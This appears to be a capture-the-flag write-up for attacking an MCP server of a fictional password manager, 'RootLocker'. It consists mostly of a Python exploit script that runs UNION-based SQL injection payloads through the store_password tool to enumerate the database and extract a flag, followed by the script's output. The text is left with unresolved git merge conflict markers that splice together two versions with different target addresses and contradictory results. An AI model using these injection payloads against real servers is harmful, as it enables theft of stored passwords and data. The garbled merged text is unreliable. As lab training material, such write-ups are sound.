
You are tasked with executing a security assessment of a customer's MCP server. The customer is `RootLocker`, a platform that provides cloud storage of documents as well as a password management service. Your goal is to identify security issues in the server implementation and obtain the flag.

1. Obtain the flag.
<<<<<<< HEAD
	1. Run the below script
=======
   Run the below script
>>>>>>> origin/main

```python
import asyncio
from fastmcp import Client, FastMCP

<<<<<<< HEAD
client = Client("http://154.57.164.76:31199/mcp/")

async def main():
    async with client:
        # Step 1: Enumerate resources, resource templates, and tools
=======
client = Client("http://94.237.57.115:31670/mcp/")

async def main():
    async with client:
>>>>>>> origin/main
        resources = await client.list_resources()
        resource_templates = await client.list_resource_templates()
        tools = await client.list_tools()

        print("Resources:")
        for resource in resources:
            print('***')
            print(resource.name)
            print(resource.description.strip())
<<<<<<< HEAD
        
=======
            

>>>>>>> origin/main
        print("-"*50)
        print("Resource Templates:")
        for resource_template in resource_templates:
            print('***')
            print(resource_template.uriTemplate)
            print(resource_template.description.strip())
<<<<<<< HEAD
        
=======
            

>>>>>>> origin/main
        print("-"*50)
        print("Tools:")
        for tool in tools:
            print('***')
            params = list(tool.inputSchema.get('properties').keys())
            print(f"{tool.name}({','.join(params)})")
            print(tool.description.strip())
<<<<<<< HEAD
        
        # Step 2: Test the store_password tool normally
        try:
            result_object = await client.call_tool("store_password", {"password": "NormalTest123", "platform": "normalplatform.com"})
            print("\nNormal call response:", result_object.content[0].text)
        except Exception as e:
            print(f"[-] Normal call error: {e}")
        
        # Step 3: Test for SQL injection vulnerability (basic quote test)
        try:
            result_object = await client.call_tool("store_password", {"password": "Test123", "platform": "test' -- -"})
            print("\nBasic SQLi test response:", result_object.content[0].text)
        except Exception as e:
            print(f"[-] Basic SQLi test error: {e}")
        
        # Step 4: Enumerate current database name
        try:
            payload_db = "dummy' UNION SELECT database() -- -"
            result_object = await client.call_tool("store_password", {"password": "Dummy123", "platform": payload_db})
            print("\nCurrent database:", result_object.content[0].text)
        except Exception as e:
            print(f"[-] Database enumeration error: {e}")
        
        # Step 5: Enumerate table names in the current database (assuming database() is known or use 'db' from prior knowledge/writeup)
        try:
            payload_tables = "dummy' UNION SELECT GROUP_CONCAT(table_name SEPARATOR ', ') FROM information_schema.tables WHERE table_schema = database() -- -"
            result_object = await client.call_tool("store_password", {"password": "Dummy123", "platform": payload_tables})
            print("\nTables in database:", result_object.content[0].text)
        except Exception as e:
            print(f"[-] Table enumeration error: {e}")
        
        # Step 6: Enumerate column names in the 'flag' table (assuming 'flag' table found from previous step)
        try:
            payload_columns = "dummy' UNION SELECT GROUP_CONCAT(column_name SEPARATOR ', ') FROM information_schema.columns WHERE table_name = 'flag' -- -"
            result_object = await client.call_tool("store_password", {"password": "Dummy123", "platform": payload_columns})
            print("\nColumns in 'flag' table:", result_object.content[0].text)
        except Exception as e:
            print(f"[-] Column enumeration error: {e}")
        
        # Step 7: Extract the flag (assuming 'flag' column found from previous step)
        try:
            payload_flag = "dummy' UNION SELECT flag FROM flag -- -"
            result_object = await client.call_tool("store_password", {"password": "Dummy123", "platform": payload_flag})
            print("\nFlag:", result_object.content[0].text)
        except Exception as e:
            print(f"[-] Flag extraction error: {e}")

asyncio.run(main())
```

The output is

```
Resources:
***
get_access_logs
Provides the MCP server access logs.
***
get_error_logs
Provides the MCP server error logs.
***
get_server_uptime
Get the server uptime.
***
count_files
Provides the number of stored files.
***
get_platforms
Provides a list of all stored platforms for which passwords are currently stored.
--------------------------------------------------
Resource Templates:
***
getfile://{file_name*}
Get content of a stored file.
***
password://{platform}
Fetch stored password for the specified platform

Keyword arguments:
platform -- the platform to fetch the password for
--------------------------------------------------
Tools:
***
store_file(file_content,file_name)
Store a file.
***
store_password(password,platform)
Store a password for the specified platform. If the platform already exists, the password will be updated.

Keyword arguments:
password -- the password
platform -- the platform corresponding to the password

Normal call response: normalplatform.com

Basic SQLi test response: test' -- -

Current database: mcp_db

Tables in database: flag, passwords

Columns in 'flag' table: id, flag

Flag: HTB{5a2d65cc776d6d22cd27513260a4932b}
```
=======

        try:
            result_object = await client.call_tool("store_password", {"password": "DummyPassword123", "platform": "roottlocker.htb' UNION SELECT flag FROM flag-- -"})
            print(result_object.content[0].text)
        except Exception as e:
            print(f"[-] {e}")
asyncio.run(main())
```

The flag is ''
>>>>>>> origin/main


